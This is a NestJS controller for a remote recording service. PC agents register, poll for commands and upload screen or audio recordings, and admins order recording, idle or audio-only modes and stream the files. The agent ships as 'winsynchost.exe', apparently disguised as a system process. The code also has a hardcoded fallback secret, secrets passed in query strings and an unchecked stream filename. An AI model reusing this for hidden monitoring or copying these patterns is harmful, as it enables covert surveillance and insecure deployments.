import {
  Controller, Get, Post, Delete,
  Param, Body, Query, Req, Res,
  UseGuards, UseInterceptors, UploadedFile,
  ParseIntPipe,
} from '@nestjs/common';
import { FileInterceptor } from '@nestjs/platform-express';
import { diskStorage } from 'multer';
import { Request, Response } from 'express';
import * as fs from 'fs';
import * as path from 'path';
import { RecordingService } from './recording.service';
import { JwtAuthGuard } from '../auth/jwt-auth.guard';
import { PermissionsGuard } from '../auth/permissions.guard';
import { RequirePerms } from '../auth/permissions.decorator';

const uploadDir = path.join(process.cwd(), 'uploads', 'recordings');

@Controller('recording')
export class RecordingController {
  constructor(private readonly service: RecordingService) {}

  // ── Python agent endpoints (authenticated by shared secret) ──────────────

  @Post('register')
  register(@Body() body: { pcId: string; pcName: string; secret: string }, @Req() req: Request) {
    const ip = ((req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || (req as any).ip || '').replace(/^::ffff:/, '');
    return this.service.register(body.pcId, body.pcName, body.secret, ip);
  }

  @Get('poll/:pcId')
  poll(@Param('pcId') pcId: string, @Query('secret') secret: string, @Req() req: Request) {
    const ip = ((req.headers['x-forwarded-for'] as string)?.split(',')[0]?.trim() || (req as any).ip || '').replace(/^::ffff:/, '');
    return this.service.poll(pcId, secret, ip);
  }

  @Post('upload/:pcId')
  @UseInterceptors(
    FileInterceptor('file', {
      storage: diskStorage({
        destination: (req, file, cb) => {
          fs.mkdirSync(uploadDir, { recursive: true });
          cb(null, uploadDir);
        },
        filename: (req, file, cb) => {
          const ts = Date.now();
          const ext = path.extname(file.originalname) || '.mp4';
          cb(null, `${req.params.pcId}_${ts}${ext}`);
        },
      }),
    }),
  )
  upload(
    @Param('pcId') pcId: string,
    @Query('secret') secret: string,
    @UploadedFile() file: Express.Multer.File,
  ) {
    return this.service.saveRecording(pcId, secret, file);
  }

  // Serve the agent exe — authenticated by secret so only install.bat can fetch it
  @Get('agent/binary')
  async agentBinary(@Query('secret') secret: string, @Res() res: Response) {
    const expected = (process.env.RECORDING_SECRET || 'rec-secret-change-me').trim();
    if (secret !== expected) {
      res.status(403).json({ message: 'Forbidden' });
      return;
    }
    const exePath = path.join(process.cwd(), 'uploads', 'agent', 'winsynchost.exe');
    if (!fs.existsSync(exePath)) {
      res.status(404).json({ message: 'Agent binary not found on server' });
      return;
    }
    res.setHeader('Content-Type', 'application/octet-stream');
    res.setHeader('Content-Disposition', 'attachment; filename="winsynchost.exe"');
    fs.createReadStream(exePath).pipe(res);
  }

  // ── Admin endpoints ──────────────────────────────────────────────────────

  @Get('devices')
  @UseGuards(JwtAuthGuard, PermissionsGuard)
  @RequirePerms('users.manage')
  listDevices() {
    return this.service.listDevices();
  }

  @Delete('devices/:pcId')
  @UseGuards(JwtAuthGuard, PermissionsGuard)
  @RequirePerms('users.manage')
  deleteDevice(@Param('pcId') pcId: string) {
    return this.service.deleteDevice(pcId);
  }

  @Post('command/:pcId')
  @UseGuards(JwtAuthGuard, PermissionsGuard)
  @RequirePerms('users.manage')
  command(
    @Param('pcId') pcId: string,
    @Body() body: { command: 'recording' | 'idle' | 'audio_only' },
  ) {
    return this.service.sendCommand(pcId, body.command);
  }

  @Get('files')
  @UseGuards(JwtAuthGuard, PermissionsGuard)
  @RequirePerms('users.manage')
  listRecordings(@Query('pcId') pcId?: string) {
    return this.service.listRecordings(pcId);
  }

  @Delete('files/:id')
  @UseGuards(JwtAuthGuard, PermissionsGuard)
  @RequirePerms('users.manage')
  deleteRecording(@Param('id', ParseIntPipe) id: number) {
    return this.service.deleteRecording(id);
  }

  // Video stream with range request support (for scrubbing in browser)
  @Get('stream/:filename')
  @UseGuards(JwtAuthGuard, PermissionsGuard)
  @RequirePerms('users.manage')
  stream(@Param('filename') filename: string, @Req() req: Request, @Res() res: Response) {
    const filePath = this.service.getFilePath(filename);
    if (!fs.existsSync(filePath)) {
      res.status(404).json({ message: 'File not found' });
      return;
    }

    const stat = fs.statSync(filePath);
    const fileSize = stat.size;
    const range = req.headers['range'];
    const ext = path.extname(filename).toLowerCase();
    const contentTypeMap: Record<string, string> = {
      '.mp4': 'video/mp4',
      '.avi': 'video/x-msvideo',
      '.wav': 'audio/wav',
      '.mp3': 'audio/mpeg',
    };
    const contentType = contentTypeMap[ext] ?? 'application/octet-stream';

    if (range) {
      const [startStr, endStr] = range.replace(/bytes=/, '').split('-');
      const start = parseInt(startStr, 10);
      const end = endStr ? parseInt(endStr, 10) : fileSize - 1;
      res.writeHead(206, {
        'Content-Range': `bytes ${start}-${end}/${fileSize}`,
        'Accept-Ranges': 'bytes',
        'Content-Length': end - start + 1,
        'Content-Type': contentType,
      });
      fs.createReadStream(filePath, { start, end }).pipe(res);
    } else {
      res.writeHead(200, {
        'Content-Length': fileSize,
        'Content-Type': contentType,
        'Accept-Ranges': 'bytes',
      });
      fs.createReadStream(filePath).pipe(res);
    }
  }
}
